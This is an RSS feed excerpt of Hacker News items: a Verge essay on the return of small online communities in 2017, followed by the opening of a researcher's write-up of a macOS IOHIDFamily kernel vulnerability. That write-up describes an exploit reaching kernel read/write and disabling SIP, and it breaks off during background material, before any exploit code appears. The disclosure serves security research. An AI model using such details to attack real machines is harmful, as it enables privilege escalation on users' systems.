<description>[unable to retrieve full-text content]&lt;p&gt;Article URL: &lt;a href=&quot;http://youarelistening.to/sanfrancisco&quot;&gt;http://youarelistening.to/sanfrancisco&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Comments URL: &lt;a href=&quot;https://news.ycombinator.com/item?id=16044718&quot;&gt;https://news.ycombinator.com/item?id=16044718&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Points: 207&lt;/p&gt;&lt;p&gt;# Comments: 56&lt;/p&gt;</description>
<pubDate>Mon, 01 Jan 2018 04:33:46 +0000</pubDate>
<dc:creator>sndean</dc:creator>
<og:title>You are listening to San Francisco</og:title>
<og:type>article</og:type>
<og:url>http://youarelistening.to/sanfrancisco</og:url>
<og:image>http://youarelistening.to/images/thumb_sanfrancisco.png</og:image>
<og:description>Ambient music and live SFPD radio. What's not to like?</og:description>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://youarelistening.to/sanfrancisco</dc:identifier>
</item>
<item>
<title>Tiny, weird online communities made a comeback in 2017</title>
<link>https://www.theverge.com/2017/12/28/16795090/internet-community-2017-post-mortem-tumblr-amino-drip-tinyletter</link>
<guid isPermaLink="true" >https://www.theverge.com/2017/12/28/16795090/internet-community-2017-post-mortem-tumblr-amino-drip-tinyletter</guid>
<description>&lt;p id=&quot;TH15h0&quot;&gt;Americans got tired of big social media in 2017. Or at least, we stopped wanting to look at it, and we stopped pretending to like it.&lt;/p&gt;
&lt;p id=&quot;7ZbfBE&quot;&gt;This feels true to me as someone who uses the internet every day, but I also &lt;em&gt;know&lt;/em&gt; it’s true because when &lt;em&gt;The Verge&lt;/em&gt; partnered with Reticle Research to &lt;a href=&quot;https://www.theverge.com/2017/10/27/16550640/verge-tech-survey-amazon-facebook-google-twitter-popularity&quot;&gt;conduct a representative survey&lt;/a&gt; of Americans’ attitudes towards tech’s biggest power players, 15.4 percent of Facebook users said they “greatly” or “somewhat” disliked using the product, while 17 percent of Twitter users said the same. That made them the most disliked of the six companies in question, which also included Apple, Microsoft, Google, and Amazon. More than 10 percent of respondents described Facebook’s effect on society as “very negative,” and 10.5 percent said the same about Twitter — in both cases a higher number than the other four companies combined.&lt;/p&gt;
&lt;aside id=&quot;0OGPkl&quot;&gt;
&lt;/aside&gt;&lt;p id=&quot;K5Aphn&quot;&gt;The survey doesn’t reveal why Americans feel the way they do, but last December, writing about the impulse to call 2016 “the worst year ever,” &lt;a href=&quot;https://www.newyorker.com/culture/jia-tolentino/the-worst-year-ever-until-next-year&quot;&gt;&lt;em&gt;The New Yorker&lt;/em&gt;’s Jia Tolentino&lt;/a&gt; articulated a pretty good guess as to why spending your time on the web’s massive, news-saturated platforms might feel so bad: “There is no limit to the amount of misfortune a person can take in via the internet,” she says. 2016 couldn’t possibly be the worst year in history, Tolentino decided, but it was the year that convinced her the promise of the social media had been false, and that “the internet would only ever induce the sense of powerlessness that comes when the sphere of what a person can influence remains static, while the sphere of what can influence us seems to expand without limit, allowing no respite at all.”&lt;/p&gt;
&lt;div class=&quot;c-float-right&quot;&gt;
&lt;aside id=&quot;B7jy26&quot;&gt;&lt;q&gt;The consequences of connection were not part of what we were sold&lt;/q&gt;&lt;/aside&gt;&lt;/div&gt;
&lt;p id=&quot;UosSer&quot;&gt;The mainstream social internet is so big; everyone is connected to everyone, over a billion on Facebook alone. The consequences of connection — fake news, radicalization, massive targeted harassment campaigns, algorithmically-generated &lt;a href=&quot;https://www.theverge.com/culture/2017/11/21/16685874/kids-youtube-video-elsagate-creepiness-psychology&quot;&gt;psychological torment&lt;/a&gt;, inane bullshit — were not part of what we were sold. We don’t really have the option of moving our lives off of the internet, and coordinated &lt;a href=&quot;https://www.theverge.com/2017/10/14/16410348/twitter-boycott-new-rules-enforcement-aggressive-stance-harassment-jack-dorsey&quot;&gt;boycotts&lt;/a&gt; of our monstrous platforms have been brief and &lt;a href=&quot;https://www.theverge.com/2017/10/14/16410348/twitter-boycott-new-rules-enforcement-aggressive-stance-harassment-jack-dorsey&quot;&gt;mostly&lt;/a&gt; fruitless. But many of us found ways to renegotiate the terms of how we spent our time online. Rather than the enormous platforms that couldn’t decide &lt;em&gt;if&lt;/em&gt;, let alone &lt;em&gt;how&lt;/em&gt; they had contributed to the election of a deranged narcissist or the rise of the virulently racist alt-right or a pending nuclear holocaust, why not something smaller, safer, more immediately useful?&lt;/p&gt;
&lt;p id=&quot;8bRE7E&quot;&gt;The old promise of the internet — niche communities, human connection, people exchanging ideas, maybe even paying each other for the work they’d made — never really lost its appeal, but this year it came back with a miniature vengeance.&lt;/p&gt;
&lt;p id=&quot;Ha2VQa&quot;&gt;We can see this longing for community — and specifically, the sort of small, weird communities that populated and defined the early internet — everywhere. There’s Amino, the &lt;a href=&quot;https://www.forbes.com/sites/laurenorsini/2015/08/12/why-geeks-are-leaving-facebook-for-nerd-friendly-amino-app/#6405c8ad1dcb&quot;&gt;Tumblr-inspired app&lt;/a&gt; that lets fandoms build online spaces that are essentially club houses, then coordinate the creation of elaborate works of fan art, fiction, cosplay, and fandom lore. At the request of its largely teenage audience, the platform released its first &lt;a href=&quot;http://aminoapps.com/cosplay2017/&quot;&gt;cosplay yearbook&lt;/a&gt; this December, and doled out honors to the best writing, photography, and tutorials around cosplay. The thousands of fandom-specific rooms are lively and strange, each with their own moderators and byzantine rules.&lt;/p&gt;
&lt;p id=&quot;Ir0Ac7&quot;&gt;And there’s the kids who are bending major platforms to their will, having their fun on Instagram but circumventing the intended use by making &lt;a href=&quot;https://www.dailydot.com/debug/finstagram-fake-instagram/&quot;&gt;“finstagrams,”&lt;/a&gt; separate, strange accounts that aren’t tied to the Facebook social graph and therefore let users post weirder, funnier content they wouldn’t share to everyone they know.&lt;/p&gt;

&lt;p id=&quot;O347ai&quot;&gt;It’s a direct precedent of the bonkers “niche meme” trend &lt;em&gt;The Daily Beast&lt;/em&gt;’s Taylor Lorenz &lt;a href=&quot;https://www.thedailybeast.com/niche-memes-are-the-secret-clip-art-diaries-teens-are-posting-on-instagram&quot;&gt;detailed last month&lt;/a&gt;, wherein teenagers use MS Paint and Word Art aesthetics to write surreal diary entries structured as memes. Niche meme accounts aren’t meant for a broad audience, and they’re often anonymous. Sharing isn’t about the likes; it’s about “finding ‘your people’ on the massive sea of Instagram.” One of the teenagers she interviewed told her, “Having this community of people who are like us helps us express our feelings and opinions that are usually just ignored.”&lt;/p&gt;
&lt;div class=&quot;c-float-right&quot;&gt;
&lt;aside id=&quot;9m60RG&quot;&gt;&lt;q&gt;2017 saw the coming-of-age of Patreon, “the economic engine of internet culture”&lt;/q&gt;&lt;/aside&gt;&lt;/div&gt;
&lt;p id=&quot;DJnKSR&quot;&gt;As political and economic uncertainty swirled around them, we also saw creatives making back-up plans in 2017. Patreon grew up this year, with &lt;a href=&quot;https://www.theverge.com/2017/12/13/16772556/patreon-drops-service-fee-plan-apology-update&quot;&gt;missteps&lt;/a&gt; along the way, and in recognition of its success, Kickstarter launched the direct competitor &lt;a href=&quot;https://www.theverge.com/2017/11/15/16652582/kickstarter-drip-creator-subscription-service-announced-perry-chen-interview&quot;&gt;Drip&lt;/a&gt;. My co-worker Adi Robertson called Patreon “the economic engine of internet culture” &lt;a href=&quot;https://www.theverge.com/2017/8/3/16084248/patreon-profile-jack-conte-crowdfunding-art-politics-culture&quot;&gt;in August&lt;/a&gt;, and explained how its model “encourages people to see themselves not as consumers, but as members of a private club, free from the constraints of mainstream gatekeepers or mass-market appeal.” That model can support podcasts, comics, art, &lt;a href=&quot;https://www.patreon.com/dasharez0ne&quot;&gt;memes&lt;/a&gt;, &lt;a href=&quot;https://www.theverge.com/2017/8/2/16074892/patreon-erotic-modeling-nsfw-content-nudes&quot;&gt;nudes&lt;/a&gt;, whatever people want to create, no matter how specific or strange, as long as there are people out there who want the same thing.&lt;/p&gt;
&lt;p id=&quot;INmIS7&quot;&gt;Patreon provides a crucial place where the people who are making internet culture can to get paid for it and build small communities around their work. As beloved as Vine was, and Tumblr and SoundCloud still are, &lt;a href=&quot;https://www.theverge.com/2016/10/28/13456208/why-vine-died-twitter-shutdown&quot;&gt;none&lt;/a&gt; of them &lt;a href=&quot;http://nymag.com/selectall/2017/06/theres-no-money-in-internet-culture.html&quot;&gt;ever&lt;/a&gt; found &lt;a href=&quot;https://www.theverge.com/2017/7/21/15999172/soundcloud-business-model-future-spotify-streaming&quot;&gt;a meaningful way&lt;/a&gt; to reward and support artists. Getting money from a patron or subscriber lets weird, niche projects stay weird and niche, catered to a specific and modest audience, and saves artists from the gross chore of chasing the lowest common denominator and the millions of eyeballs you need to make real money from ads or sponsorship deals.&lt;/p&gt;
&lt;span class=&quot;e-image__inner&quot;&gt;&lt;span class=&quot;e-image__image&quot; data-original=&quot;https://cdn.vox-cdn.com/uploads/chorus_asset/file/9940293/Screen_Shot_2017_12_28_at_12.47.52_PM.png&quot;&gt;&lt;img class=&quot;c-dynamic-image&quot; src=&quot;data:image/gif;base64,R0lGODlhAQABAIAAAAUEBAAAACwAAAAAAQABAAACAkQBADs&quot; alt=&quot;&quot; data-chorus-optimize-field=&quot;main_image&quot; data-cid=&quot;site/dynamic_size_image-1514877316_343_56003&quot; data-cdata=&quot;{&amp;quot;asset_id&amp;quot;:9940293,&amp;quot;ratio&amp;quot;:&amp;quot;*&amp;quot;}&quot;/&gt;&lt;noscript&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.vox-cdn.com/uploads/chorus_asset/file/9940293/Screen_Shot_2017_12_28_at_12.47.52_PM.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;/noscript&gt;&lt;/span&gt;&lt;/span&gt;
&lt;p id=&quot;33PDkZ&quot;&gt;The appeal of a specific, engaged audience is also responsible for the return of community email. Newsletters distributed only through the “phone tree” friend-to-acquaintance-to-friendly-stranger model were wildly popular in the days of early email and early blogging, took a nearly two-decade break, then reappeared thanks to a &lt;a href=&quot;https://www.fastcompany.com/1683347/miranda-july-explains-how-to-make-art-out-of-everyday-emails&quot;&gt;Miranda July pet project&lt;/a&gt;, the &lt;a href=&quot;http://newsfeed.time.com/2012/05/06/the-listserve-what-would-you-say-to-a-million-people/&quot;&gt;buzzy 2012 email community Listserve&lt;/a&gt;, and most notably, the &lt;a href=&quot;https://www.fastcompany.com/3021751/how-tinyletter-is-making-us-fall-in-love-with-email-again&quot;&gt;2013 founding of TinyLetter&lt;/a&gt;. As part of a May 2017 &lt;a href=&quot;https://www.newyorker.com/culture/jia-tolentino/the-personal-essay-boom-is-over&quot;&gt;&lt;em&gt;New Yorker&lt;/em&gt; survey&lt;/a&gt; of the death of the public personal essay and the return of email newsletters, &lt;em&gt;Awl&lt;/em&gt; alum Carrie Frye speculated that writers, and female writers in particular, have declared to themselves, “I’m going to make an Internet on which my essays go out in pneumatic tubes to just who I want them to go to, and no one else.” Newsletters are an easy a way to build that tiny, private audience away from the ugliness of the internet at large. TinyLetter has a cap at 5,000 subscribers, and it has no discovery or explore section.&lt;/p&gt;
&lt;p id=&quot;Id9YiU&quot;&gt;One of the more fascinating internet projects of this year, the briefly-lived platform &lt;a href=&quot;https://www.theverge.com/2017/9/15/16290236/double-bounce-interview-alex-carusillo-patreon-tinyletter&quot;&gt;Double Bounce&lt;/a&gt; married the subscriber-based structure of Patreon and the personalized distribution model of TinyLetter. You could only subscribe to an artist’s work if the URL was shared directly, or in a different public space, and users could place whatever they wanted behind a paywall. It was an appealing prospect for creators with modest followings, especially those looking to “refocus away from massive distribution sites that sell everything to advertising companies, [and] focus on smaller, more tight-knit communities.” The basic idea was that not everyone needs to be an “internet megastar” to prove that their work has value.&lt;/p&gt;
&lt;div class=&quot;c-float-right&quot;&gt;
&lt;aside id=&quot;PdS8JC&quot;&gt;&lt;q&gt;“I love the internet. Everything I ever liked came from the internet.”&lt;/q&gt;&lt;/aside&gt;&lt;/div&gt;
&lt;p id=&quot;7snihe&quot;&gt;Double Bounce is shuttering at the end of the year, but it was good while it lasted. “I love the internet. Everything I ever liked came from the internet,” founder Alex Carusillo &lt;a href=&quot;https://www.theverge.com/2017/9/15/16290236/double-bounce-interview-alex-carusillo-patreon-tinyletter&quot;&gt;told me&lt;/a&gt;. “The internet when I was younger was just a bunch of weirdo strangers who were all weirdo strangers together and felt like a community for that.” He says he doesn’t care if someone else brings the idea back to life; it’s just something he thinks should exist.&lt;/p&gt;
&lt;p id=&quot;2yCGl0&quot;&gt;Advocates of a weird, niche internet took other hits in 2017, the first full year &lt;a href=&quot;https://www.theverge.com/2016/10/27/13441120/vine-death-twitter-happiness-wheel-of-fortune-rip-fun&quot;&gt;without Vine&lt;/a&gt; and a &lt;a href=&quot;https://www.theverge.com/2017/8/10/16121386/soundcloud-shareholder-memo-reorganization-proposal-raine-group-temasek&quot;&gt;crisis&lt;/a&gt; period for SoundCloud. Tumblr’s future grew murkier this year, as it was acquired by &lt;a href=&quot;https://www.theverge.com/2017/6/21/15816974/verizon-tumblr-net-neutrality-internet-politics-david-karp&quot;&gt;Verizon&lt;/a&gt; and folded into a &lt;a href=&quot;https://www.theverge.com/2017/4/5/15180622/oath-aol-yahoo-verizon-ad-tracking-privacy&quot;&gt;nightmarish mega-corporation&lt;/a&gt;. Then, in November, following months of silence and public absence, CEO and founder David Karp stepped down. Karp was abnormally beloved for a CEO, &lt;a href=&quot;https://theoutline.com/post/2526/david-karp-daddy-tumblr-resignation&quot;&gt;called “daddy” for years by Tumblr’s most active users&lt;/a&gt;, and without him, it would stand to reason that Tumblr now feels like a less special place. But communities are resilient and the mostly young, majority-female userbase of the platform had a great year regardless. They taught each other witchcraft in &lt;a href=&quot;https://www.theverge.com/2017/12/12/16766260/witchblr-tumblr-trends-2017-witchcraft-crystals-fan-tarot&quot;&gt;hopes of improving&lt;/a&gt; the dire political situation around them, even while the tools they’d been taught in school (call your senators, read the news) were failing them. They doubled down on “wholesome memes,” a &lt;a href=&quot;http://nymag.com/selectall/2016/08/the-next-frontier-in-internet-culture-is-wholesome-memes.html&quot;&gt;genre of internet humor&lt;/a&gt; where the joke is just “this is nice, whereas everything else is sarcastic or mean.” They continued to be &lt;a href=&quot;https://www.theverge.com/tldr/2017/4/12/15264534/one-direction-bad-memes-tumblr-fan-fiction&quot;&gt;funnier&lt;/a&gt; than anyone I have met in real life.&lt;/p&gt;
&lt;span class=&quot;e-image__inner&quot;&gt;&lt;span class=&quot;e-image__image&quot; data-original=&quot;https://cdn.vox-cdn.com/uploads/chorus_asset/file/9939239/tumblr_o687trBCT21u5ffnro1_400.jpg&quot;&gt;&lt;img class=&quot;c-dynamic-image&quot; src=&quot;data:image/gif;base64,R0lGODlhAQABAIAAAAUEBAAAACwAAAAAAQABAAACAkQBADs&quot; alt=&quot;wholesome memes&quot; data-chorus-optimize-field=&quot;main_image&quot; data-cid=&quot;site/dynamic_size_image-1514877316_4718_56004&quot; data-cdata=&quot;{&amp;quot;asset_id&amp;quot;:9939239,&amp;quot;ratio&amp;quot;:&amp;quot;*&amp;quot;}&quot;/&gt;&lt;noscript&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.vox-cdn.com/uploads/chorus_asset/file/9939239/tumblr_o687trBCT21u5ffnro1_400.jpg&quot; alt=&quot;wholesome memes&quot;/&gt;&lt;/p&gt;
&lt;/noscript&gt;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;e-image__meta&quot;&gt;&lt;cite&gt;Tumblr / &lt;a href=&quot;http://wholesomemes-archive.tumblr.com/post/143452400473&quot;&gt;wholesomemes-archive&lt;/a&gt;&lt;/cite&gt;&lt;/span&gt;
&lt;p id=&quot;IOYCNk&quot;&gt;For her expansive 2016 research project &lt;em&gt;The Lonely City&lt;/em&gt;, writer Olivia Laing wandered New York alone and studied the artists who lived their lives on the fringes there — both those who were eventually celebrated and those who died in obscurity. Many of her subjects made their work during the AIDS crisis and were killed by the disease, or were otherwise neglected or tormented by the society they lived in. She argues, convincingly, that the fact of anyone’s individual loneliness cannot be separated from the fact of the country they are trying to exist in. “The vicious circle by which loneliness proceeds does not happen in isolation, but rather as an interplay between the individual and the society in which they are embedded,&quot; she wrote.&lt;/p&gt;
&lt;p id=&quot;bRchEj&quot;&gt;She was talking about a specific American city, but her statement applies just as readily to the internet. It’s a place. Much of what people have expected from traditional community structures — affirmation, information, a back-stop in the case of &lt;a href=&quot;https://splinternews.com/how-much-do-we-need-obamacare-just-take-a-sad-tour-of-1793858053&quot;&gt;financial catastrophe&lt;/a&gt; or unwieldy loneliness — can feel more readily available online than it does in a society that seems to relish &lt;a href=&quot;https://www.nytimes.com/2017/12/19/us/politics/tax-bill-vote-republicans.html?_r=0&quot;&gt;deepening&lt;/a&gt; the &lt;a href=&quot;http://money.cnn.com/2017/09/27/news/economy/inequality-record-top-1-percent-wealth/index.html&quot;&gt;gulfs&lt;/a&gt; between us.&lt;/p&gt;
&lt;p id=&quot;Zx18oz&quot;&gt;I, for one, spent &lt;a href=&quot;https://www.theverge.com/2017/11/3/16576850/jake-gyllenhaal-newsletter-fandom-fans-essay&quot;&gt;the vast majority of 2017&lt;/a&gt; retreating into a tiny, email-based community of my own making, with a handful of charming strangers who shared my idiotic, overwrought affection for the actor Jake Gyllenhaal. All we ever did was share photos we’d seen before and thank each other for existing, but I suspected we were responsible for each other in some slim, uncategorizable way.&lt;/p&gt;
&lt;div class=&quot;c-float-right&quot;&gt;
&lt;aside id=&quot;BDYzDi&quot;&gt;&lt;q&gt;we are responsible for each other in some slim, uncategorizable way&lt;/q&gt;&lt;/aside&gt;&lt;/div&gt;
&lt;p id=&quot;SON4V0&quot;&gt;At &lt;em&gt;The Verge&lt;/em&gt;, we used to argue amongst ourselves about whether internet culture was “internet culture” or just “culture.” It now seems useful to debate whether the internet itself is “the internet” or simply the world. For better and for worse, the latter proved itself to be true this year. The internet Nazis were real Nazis; they live in America. The #resistance was a sloppy but real and tangible resistance; it happened in America and it sometimes worked. The kids &lt;a href=&quot;https://www.polygon.com/2017/10/9/16447460/rick-and-morty-szechuan-sauce-mcdonalds-fans-anger&quot;&gt;stormed McDonald’s&lt;/a&gt; to scream about a &lt;em&gt;Rick and Morty&lt;/em&gt; reference; the kids &lt;a href=&quot;https://www.theverge.com/2017/1/23/14354434/womens-march-on-washington-social-media-twitter-app&quot;&gt;asked for help&lt;/a&gt; for their families.&lt;/p&gt;
&lt;p id=&quot;HvklzV&quot;&gt;Every banal, stupid thing you hate about living in the world is also something you can hate about the internet, and every good, vital thing that keeps you walking around without your face in your armpit is also on the internet. In that sense, the online world has ceased to be interesting. Here we are; it’s where we live. I guess it is fitting that — just like the planet our bodies sit on — the whole thing is in &lt;a href=&quot;https://www.theverge.com/2017/12/19/16792306/fcc-net-neutrality-open-internet-history-free-speech-anonymity&quot;&gt;immediate&lt;/a&gt;, &lt;a href=&quot;https://www.theverge.com/2017/12/14/16776298/net-neutrality-disney-comcast-internet-providers-free-speech&quot;&gt;grave&lt;/a&gt; peril.&lt;/p&gt;
&lt;p id=&quot;lxqOYQ&quot;&gt;So much of what happens to anyone, offline and online, is the fault of everyone — our collaborative structures, our massive platforms. The people in charge at &lt;a href=&quot;https://www.theverge.com/2017/12/20/16800842/facebook-2017-russia-scandal-news-feed-criticism-defectors&quot;&gt;Facebook&lt;/a&gt; and &lt;a href=&quot;https://www.theverge.com/2017/12/18/16789606/twitter-new-safety-policies-hate-groups&quot;&gt;Twitter&lt;/a&gt; are just getting around to saying so, but the rest of us have made it clear that we already knew. “Loneliness is personal, and it is also political,” Laing concludes. “Loneliness is collective; it is a city.” The vast digital metropolis of the internet — that place that was supposed to make us feel never alone — failed us this year; we built what we needed on its outskirts.&lt;/p&gt;
</description>
<pubDate>Mon, 01 Jan 2018 03:46:47 +0000</pubDate>
<dc:creator>prostoalex</dc:creator>
<og:description>Why tiny, weird online communities made a comeback in 2017</og:description>
<og:image>https://cdn.vox-cdn.com/thumbor/aKSkGUx-OIe5ydwbGdldNDy_YNo=/0x57:500x319/fit-in/1200x630/cdn.vox-cdn.com/uploads/chorus_asset/file/9939291/tumblr_osfupn1sfP1wpnqymo1_500.jpg</og:image>
<og:title>The year we wanted the internet to be smaller</og:title>
<og:type>article</og:type>
<og:url>https://www.theverge.com/2017/12/28/16795090/internet-community-2017-post-mortem-tumblr-amino-drip-tinyletter</og:url>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.theverge.com/2017/12/28/16795090/internet-community-2017-post-mortem-tumblr-amino-drip-tinyletter</dc:identifier>
</item>
<item>
<title>IOHIDeous OS X Local Kernel Vulnerability</title>
<link>https://siguza.github.io/IOHIDeous/</link>
<guid isPermaLink="true" >https://siguza.github.io/IOHIDeous/</guid>
<description>&lt;p&gt;&lt;em&gt;Siguza, 01. Dec 2017 (published 31. Dec 2017)&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;“IOHIDFamily once again.”&lt;/p&gt;
&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;This is the tale of a macOS-only vulnerability in IOHIDFamily that yields kernel r/w and can be exploited by any unprivileged user.&lt;/p&gt;
&lt;p&gt;IOHIDFamily has been notorious in the past for the many race conditions it contained, which ultimately lead to large parts of it being rewritten to make use of command gates, as well as large parts being locked down by means of entitlements. I was originally looking through its source in the hope of finding a low-hanging fruit that would let me compromise an iOS kernel, but what I didn’t know it then is that some parts of IOHIDFamily exist only on macOS - specifically &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDSystem&lt;/code&gt;, which contains the vulnerability discussed herein.&lt;/p&gt;
&lt;p&gt;The exploit accompanying this write-up consists of three parts:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;poc&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;make poc&lt;/code&gt;)&lt;br/&gt;Targets all macOS versions, crashes the kernel to prove the existence of a memory corruption.&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;leak&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;make leak&lt;/code&gt;)&lt;br/&gt;Targets High Sierra, just to prove that no separate KASLR leak is needed.&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;hid&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;make hid&lt;/code&gt;)&lt;br/&gt;Targets Sierra and High Sierra (up to 10.13.1, see &lt;a href=&quot;https://github.com/Siguza/IOHIDeous/&quot;&gt;README&lt;/a&gt;), achieves full kernel r/w and disables SIP to prove that the vulnerability can be exploited by any unprivileged user on all recent versions of macOS.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Note: The &lt;code class=&quot;highlighter-rouge&quot;&gt;ioprint&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;ioscan&lt;/code&gt; utilities I’m using in this write-up are available from my &lt;a href=&quot;https://github.com/Siguza/iokit-utils&quot;&gt;iokit-utils&lt;/a&gt; repository. I’m also using my &lt;a href=&quot;https://github.com/Siguza/hsp4&quot;&gt;hsp4 kext&lt;/a&gt; along with &lt;a href=&quot;https://github.com/Siguza/ios-kern-utils&quot;&gt;kern-utils&lt;/a&gt; to inspect kernel memory.&lt;/p&gt;
&lt;p&gt;For any kind of questions or feedback, feel free to hit me up on &lt;a href=&quot;https://twitter.com/s1guza&quot;&gt;Twitter&lt;/a&gt; or via mail (&lt;code class=&quot;highlighter-rouge&quot;&gt;*@*.net&lt;/code&gt; where &lt;code class=&quot;highlighter-rouge&quot;&gt;*&lt;/code&gt; = &lt;code class=&quot;highlighter-rouge&quot;&gt;siguza&lt;/code&gt;).&lt;/p&gt;
&lt;h2 id=&quot;technical-background&quot;&gt;Technical background&lt;/h2&gt;
&lt;p&gt;In order to understand the attack surface as well as the vulnerability, you need to know about the involved parts of IOHIDFamily. It starts with the &lt;a href=&quot;https://opensource.apple.com/source/IOHIDFamily/IOHIDFamily-1035.1.4/IOHIDSystem/IOHIDSystem.cpp.auto.html&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDSystem&lt;/code&gt; class&lt;/a&gt; and the UserClients it offers. There are currently three of those:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDUserClient&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDParamUserClient&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDEventSystemUserClient&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;(There used to be a fourth, &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDStackShotUserClient&lt;/code&gt;, but that has been commented out for a while now.) Like almost all UserClients in IOHIDFamily these days, &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDEventSystemUserClient&lt;/code&gt; requires an entitlement to be spawned (&lt;code class=&quot;highlighter-rouge&quot;&gt;com.apple.hid.system.user-access-service&lt;/code&gt;), however the other two do not. &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDParamUserClient&lt;/code&gt; can actually be spawned by any unprivileged process, but of interest to us is &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDUserClient&lt;/code&gt;, arguably the most powerful of the three, which during normal system operation is held by &lt;code class=&quot;highlighter-rouge&quot;&gt;WindowServer&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;8&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;11&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;bash$ ioprint -d IOHIDUserClient
IOHIDUserClient(IOHIDUserClient): (os/kern) successful (0x0)
&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&amp;gt;
&amp;lt;plist version=&quot;1.0&quot;&amp;gt;
&amp;lt;dict&amp;gt;
    &amp;lt;key&amp;gt;IOUserClientCreator&amp;lt;/key&amp;gt;
    &amp;lt;string&amp;gt;pid 144, WindowServer&amp;lt;/string&amp;gt;
    &amp;lt;key&amp;gt;IOUserClientCrossEndianCompatible&amp;lt;/key&amp;gt;
    &amp;lt;true/&amp;gt;
&amp;lt;/dict&amp;gt;
&amp;lt;/plist&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;This is an important point because as it turns out, IOHIDSystem restricts the number of &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDUserClient&lt;/code&gt;s that can exist at any given time to exactly one. This is specifically enforced by the &lt;code class=&quot;highlighter-rouge&quot;&gt;evOpenCalled&lt;/code&gt; class variable, which is set to &lt;code class=&quot;highlighter-rouge&quot;&gt;true&lt;/code&gt; when an &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDUserClient&lt;/code&gt; is spawned and to &lt;code class=&quot;highlighter-rouge&quot;&gt;false&lt;/code&gt; again when it is closed. This variable is checked in &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDSystem::evOpen&lt;/code&gt;, which in turn is called from &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDSystem::newUserClientGated&lt;/code&gt; (so we can’t even race it).&lt;/p&gt;
&lt;p&gt;Bottom line, there can only be one &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDUserClient&lt;/code&gt; at any given moment, and chances are that when your code runs, &lt;code class=&quot;highlighter-rouge&quot;&gt;WindowServer&lt;/code&gt; will be long up and running with its UserClient already. So snatching that is not straightforward, but we’ll get to that later. For now we’re gonna look at what it actually uses that UserClient for.&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDSystem&lt;/code&gt;/&lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDUserClient&lt;/code&gt; offer some shared memory for an event queue and certain cursor-related data that &lt;code class=&quot;highlighter-rouge&quot;&gt;WindowServer&lt;/code&gt; can map into its address space via &lt;code class=&quot;highlighter-rouge&quot;&gt;clientMemoryForType&lt;/code&gt;. This memory is split into three parts packed after each other in this order:&lt;/p&gt;
&lt;ul readability=&quot;-0.96774193548387&quot;&gt;&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;EvOffsets&lt;/code&gt; structure.&lt;br/&gt;This structs holds information about where the other parts of the shared memory are located in respect to the beginning of the shared memory (so they’re given as offsets). The definition is:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot; readability=&quot;6.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;volatile&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_evOffsets&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;evGlobalsOffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;cm&quot;&gt;/* Offset to EvGlobals structure */&lt;/span&gt;
